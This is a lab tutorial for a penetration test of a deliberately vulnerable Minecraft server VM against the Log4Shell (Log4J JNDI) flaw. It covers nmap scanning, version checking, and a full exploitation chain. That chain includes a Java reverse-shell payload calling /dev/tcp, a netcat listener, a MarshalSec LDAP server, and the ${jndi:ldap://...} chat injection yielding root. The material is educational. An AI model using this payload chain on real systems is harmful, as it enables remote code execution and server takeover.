.. _minier:

Minier - Log4J Vulnerability
============================
*"Minier is a famous Minecraft server that serves more than 1000 players every day.*

*Recently, the discovery of Log4J RCE vulnerability worries the owner of the server, which is you.*

*Your task is to test whether Minier is vulnerable to Log4J RCE attack and find out the implications of this vulnerability to your server.*
*Do not forget to write a report."*

.. note::

    This particular tutorial is based on `John Hammond's proof-of-concept exploit <https://www.youtube.com/watch?v=7qoPDq41xhQ>`_.
    Credits & kudos to John Hammond.

Pre-Enggagements
----------------

Setting up the server
~~~~~~~~~~~~~~~~~~~~~

.. note::

    Visit the :ref:`download center <download-center>` to download VMWare Workstation Player, Kali Linux VM, MarshalSec, and Minier VM.

In order to do our job properly, let us setup the server in our local VMWare Network.
Follow the instructions in :ref:`download center <download-center>` in order to setup the server.

We will utilize :ref:`Kali Linux VM <download-center>` to test this server.

Testing Type
~~~~~~~~~~~~
Technically, we could treat this as a **White Box Testing**, since this is our own server, and we know the specifications.

We know that the server version being deployed is :ref:`PaperMC v1.8.8 Build 443 <download-center>`.

Testing Boundaries
~~~~~~~~~~~~~~~~~~
We will limit the test to the **services available within every open port**, and the **home directory of every user** that we found.
Everything else is restricted, and will not be touched.

Any files that we found can be read, but not write.
This means **editing or tampering files are strictly prohibited**.

The test will be considered a success if we can achieve **Remote Code Execution (RCE)**.

Information Gathering
---------------------

Finding the target
~~~~~~~~~~~~~~~~~~
To find the target's IP Address, we will leverage VMWare's NAT capabilities.
By setting the simulation within VMWare's NAT-based network, we can isolate every IP that we come across.

First, find out our network address. We can achieve this by running ``ifconfig`` in our Kali.

.. code-block:: console

    > ifconfig

    eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.233.131  netmask 255.255.255.0  broadcast 192.168.233.255
        inet6 fe80::20c:29ff:fec9:e51b  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:c9:e5:1b  txqueuelen 1000  (Ethernet)
        RX packets 72  bytes 7581 (7.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 68  bytes 9262 (9.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

    lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

The result shows ``IP Address: 192.168.233.131`` and ``Subnet: 255.255.255.0``.
This can tell us the network address, which is ``192.168.233.0/24``.

Now we can scan throughout the network address. We will be using :ref:`Nmap<nmappage>` to conduct the scanning process.

.. code-block:: console

    > sudo nmap 192.168.233.0/24

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-18 00:59 EDT
    Nmap scan report for 192.168.233.1
    Host is up (0.0016s latency).
    All 1000 scanned ports on 192.168.233.1 are in ignored states.
    Not shown: 1000 filtered tcp ports (no-response)
    MAC Address: 00:50:56:C0:00:08 (VMware)

    Nmap scan report for 192.168.233.2
    Host is up (0.0011s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE
    53/tcp open  domain
    MAC Address: 00:50:56:F6:D5:14 (VMware)

    Nmap scan report for 192.168.233.133
    Host is up (0.0026s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    MAC Address: 00:0C:29:56:6B:58 (VMware)

    Nmap scan report for 192.168.233.254
    Host is up (0.00037s latency).
    All 1000 scanned ports on 192.168.233.254 are in ignored states.
    Not shown: 1000 filtered tcp ports (no-response)
    MAC Address: 00:50:56:E5:53:87 (VMware)

    Nmap scan report for 192.168.233.131
    Host is up (0.000018s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh

    Nmap done: 256 IP addresses (5 hosts up) scanned in 7.76 seconds

We have found 5 IPs. We can isolate our target by sifting these 5 IPs.

- ``192.168.233.1`` is our host machine.
- ``192.168.233.2`` is VMWare NAT device.
- ``192.168.233.254`` is our DHCP server.
- ``192.168.233.131`` is our Kali machine.

Thus, ``192.168.233.133`` is our target.

.. important::

    Make sure your VMs are set to NAT networking. This is to isolate their locations within the VMWare's network.

Scanning Operating System
~~~~~~~~~~~~~~~~~~~~~~~~~
We can also utilize :ref:`Nmap<nmappage>` to find out what operating system this server is running.
We will be using the ``-O`` argument, which is used to scan for operating system fingerprints.

.. code-block:: console

    > sudo nmap 192.168.233.133 -O

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 01:41 EDT
    Nmap scan report for 192.168.233.133
    Host is up (0.00053s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE
    22/tcp open  ssh
    MAC Address: 00:0C:29:56:6B:58 (VMware)
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.6
    Network Distance: 1 hop

    OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds

From the scan results, we found out that this server runs ``Linux``.

Enumerating Open Ports
~~~~~~~~~~~~~~~~~~~~~~
Servers tend to have open ports in order to expose their services.
We could enumerate these ports to find out what kinds of services this server has exposed.

We can use :ref:`Nmap<nmappage>` to scan these ports.
We will be using ``-p -`` argument, to scan every port (0 - 65535).
We will also be using ``-sV`` argument to scan its software versions.

.. code-block:: console

    > sudo nmap 192.168.233.133 -p - -sV

    Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-22 01:42 EDT
    Nmap scan report for 192.168.233.133
    Host is up (0.00019s latency).
    Not shown: 65533 closed tcp ports (reset)
    PORT      STATE SERVICE   VERSION
    22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    25565/tcp open  minecraft Minecraft 1.8.8 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
    MAC Address: 00:0C:29:56:6B:58 (VMware)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds

From the scan results, we have found that:

- Port ``22`` contains an OpenSSH server.
- Port ``25565`` contains a Minecraft 1.8.8 server.

If we try to connect to ``port 25565`` from a Minecraft 1.8.8 client, we can see that there is indeed an active Minecraft server.

.. image:: /images/minecraftsetting.png
   :class: with-border
   :scale: 100%


.. image:: /images/minecraftconnect.png
   :class: with-border
   :scale: 100%

Vulnerability Analysis
----------------------

Understanding the Log4J Vulnerability
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. note::

    Explanation based on Java Brains `Log4Shell video <https://www.youtube.com/watch?v=uyq8yxWO1ls>`_.
    Credits and kudos to Java Brains.

There are 3 main factors that incorporated this vulnerabilty:

- Log4J Log Expressions
- JNDI (Java Naming and Directory Interface)
- JNDI Lookups in Log4J Log Messages

Log4J Log Expressions
^^^^^^^^^^^^^^^^^^^^^
The Log4J module allows logging using expressions.

Take a look at the example code snippet:

.. code-block:: java

    final Logger logger = LogManager.getLogger();
    logger.info("{} says hello to {}", "Adam", "Bryan");

The log output would be ``Adam says hello to Bryan``.

The string ``"Adam"`` and ``"Bryan"`` will be appended according to the supplied expression.

JNDI (Java Naming and Directory Interface)
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
``JNDI`` is a Java feature that enables remote object serialization.

This means by using ``JNDI``, we can serialize objects from other locations by requesting it (for example, by using ``LDAP`` protocol).

This is a very old feature (according to `Java Brains <https://www.youtube.com/c/JavaBrainsChannel>`_, ``JNDI`` already existed before the rise of REST API popularity)

JNDI Lookups in Log4J Log Messages
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
The Log4J module enables JNDI lookups from logging messages.
This feature was introduced sometime in 2013 by a contributor.

Take a look at the example code snippet:

.. code-block:: java

    final Logger logger = LogManager.getLogger();
    logger.info("{} says hello to {}", "Adam", "${jndi:ldap://adam/getadamsfriends}");

In this snippet, the Log4J module parses the ``JNDI`` lookup request.
Specifically, it requests from the ``LDAP`` url, serializing the response object into the logging message.

The Problem with JNDI Lookups
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Essentially, by serializing objects from ``JNDI`` lookup requests, we can inject any piece of code into whatever application that utilizes the Log4J module.

Take a look at the example code snippet:

.. code-block:: java

    import java.io.*;

    public class Log4jRCE {
        static {
            System.out.println("Big hehe");
        }
    }

When run, this snippet will output ``"Big hehe"``  in the console.

By compiling this snippet into a ``.class`` file, and loading it in an ``LDAP`` request, we can remotely execute this code from the Log4J module.

.. code-block:: java

    final Logger logger = LogManager.getLogger();
    logger.info("{} says hello to {}", "Adam", "${jndi:ldap://bighehe/Log4jRCE}");

``"Big hehe"`` will not be logged. Rather, it will be shown in the console.

This is because the ``.class`` file is serialized within the ``JNDI`` block, and ``"Big hehe"`` is streamed into the system console.

This is a very dangerous vulnerability, since we can pretty much put anything within the ``.class`` file, and it will be executed, no matter what the code is.

.. note::
    
    According to the `CVE-2021-44228 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228>`_ entry, this vulnerability exists in Log4J ``v2.0-beta9`` through ``v2.15.0``, excluding security releases ``v2.12.2``, ``v2.12.3``, and ``v2.3.1``. 

Checking the Server's Log4J version
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
.. important::

    This step requires Java 8 or higher.

In order to find the Log4J version, we need to do a quick setup to the server.
Run the command ``java -jar paper-1.8.8-443.jar``.

.. code-block:: console

    > java -jar paper-1.8.8-443.jar

    Downloading original jar...
    Patching original jar...
    Loading libraries, please wait...
    2022-06-22 14:24:48,277 WARN Unable to instantiate org.fusesource.jansi.WindowsAnsiOutputStream
    [ERROR] Terminal initialization failed; falling back to unsupported
    java.lang.NoClassDefFoundError: Could not initialize class org.fusesource.jansi.internal.Kernel32
            [...]

    [14:24:50 INFO]: Starting minecraft server version 1.8.8
    [14:24:50 INFO]: Loading properties
    [14:24:50 WARN]: server.properties does not exist
    [14:24:50 INFO]: Generating new properties file
    [14:24:50 WARN]: Failed to load eula.txt
    [14:24:50 INFO]: You need to agree to the EULA in order to run the server. Go to eula.txt for more info.
    [14:24:50 INFO]: Stopping server
    >[WARN] Task failed
    java.lang.NoClassDefFoundError: Could not initialize class org.fusesource.jansi.internal.Kernel32
            [...]

Do not be surprised if this error pops out.
This error specifies that we need to agree to the EULA in order to run this particular server.
**We do not need to do this step**, since we only need the Minecraft server core executable, which is located in the ``cache`` directory.

By digging through ``original.jar`` file (Minecraft server core executable), we should be able to acquire the Log4J Version.
To open ``original.jar`` file, you can use archiving tools, such as `WinRAR <https://www.win-rar.com/start.html?&L=0>`_, `7-Zip <https://www.7-zip.org/>`_, etc.

The Log4J library version is located in ``original.jar/META-INF/log4j-provider.properties``, specifically in the ``Log4jAPIVersion`` property.

.. image:: /images/7zipcache.png
   :scale: 100%

.. code-block:: console

    > cat log4j-provider.properties

    [...]
    LoggerContextFactory = org.apache.logging.log4j.core.impl.Log4jContextFactory
    Log4jAPIVersion = 2.0.0
    FactoryPriority= 10

This particular Minecraft server is using ``Log4J v2.0.0``, which is vulnerable to the Log4J vulnerability.
We can confirm this by checking the `CVE-2021-44228 <https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228>`_ entry.

Exploitation
------------

.. important::

    This step requires Java 8 or higher.

In this particular exploitation, we will run 3 services within our Kali server:

- A ``netcat`` server running on ``port 4444``
- A ``HTTP`` server hosting the payload that establishes a reverse TCP connection to the ``netcat`` server.
- An ``LDAP`` server, serializing the payload within the ``HTTP`` server into the target server.

Running the Netcat Server
~~~~~~~~~~~~~~~~~~~~~~~~~
This ``netcat`` server is used to listen to any reverse TCP connections, particularly the ones that we'll establish from the Minecraft server.
Once the connection is established, we will send our commands from this server.

This step is pretty straightforward, just run ``nc -lvp <PORT>``.
The arguments ``-l`` is used to listen to inbound connections, ``-v`` for verbose outputs, and ``-p`` to specify its port.

.. code-block:: console

    > nc -lvp 4444

Creating Java Shell Payload
~~~~~~~~~~~~~~~~~~~~~~~~~~~
Let us prepare the shell payload.
Since the Minecraft server runs on Java, we will also write the payload in Java.

.. code-block:: console

    > nano Log4jRCE.java

.. code-block:: java

    import java.io.*;

    public class Log4jRCE {
        static {
            try {
                Process pr = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/192.168.233.131/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"});
                pr.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

This particular payload will launch a reverse TCP bash shell within the server, receiving commands from our Kali server on ``port 4444``.
We can then send commands using ``netcat``.

Compile the code into a proper Java ``class`` file.

.. code-block:: console

    > javac Log4jRCE.java
    > ls

    Log4jRCE.class  Log4jRCE.java

Finally, run a ``HTTP`` server on top of the ``.class`` file.

.. code-blocK::

    > python3 -m http.server

    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

.. note::

    You can use any tool to run the ``HTTP`` server.
    It doesn't have to specifically be Python.

Preparing LDAP Marshaler
~~~~~~~~~~~~~~~~~~~~~~~~
.. note::

    For MarshalSec setup tutorial, refer to the :ref:`Download Center <download-center>`.

We will use :ref:`MarshalSec <download-center>` to establish an ``LDAP`` server that serializes our payload into the Minecraft server.

Within the MarshalSec directory, run the command ``java -cp target/marshalsec-<VERSION>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<HTTP IP>:<HTTP PORT>/#<CLASSNAME>"``.
This command will start the ``LDAP`` server, serializing the payload within our ``HTTP`` server.

.. code-block:: console

    > java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.233.131:8000/#Log4jRCE"

    Listening on 0.0.0.0:1389

Exploiting JNDI
~~~~~~~~~~~~~~~
Now that we know this server is vulnerable to the Log4J vulnerability, we can inject our payload by using the :ref:`MarshalSec<download-center>` marshaler via the Minecraft server's ``JNDI`` module.

Connect into the Minecraft server using the Minecraft client.

When we are in, go ahead and send ``${jndi:ldap://<LDAP IP>:<LDAP PORT>/<CLASS NAME>}`` into the chatbox.

.. image:: /images/minecraftjndibefore.png
   :scale: 100%

Here is a summarized rundown of what will happen:

1. When the message is sent, the ``JNDI`` module will start parsing the command within the ``JNDI`` block, which is an ``LDAP`` request to ``port 1389``.
2. The ``LDAP`` server will then refer to the ``HTTP`` server containing the ``Log4jRCE.class`` payload.
3. The payload will then be serialized into and executed within the ``JNDI`` block.
4. A reverse TCP connection will be established with the ``netcat`` server on ``port 4444``

.. image:: /images/minecraftjndiafter.png
   :scale: 100%

After the reverse TCP connection is established, we can run pretty much any command from the ``netcat`` server.

.. code-block:: console

    > whoami

    root

At this point, RCE is achieved, and we can stop the pentest.

Post-Exploitation
-----------------
Since we have achieved RCE on our Exploitation_ phase, our pentesting ends here.

You can do pretty much anything you want here.

Reporting
---------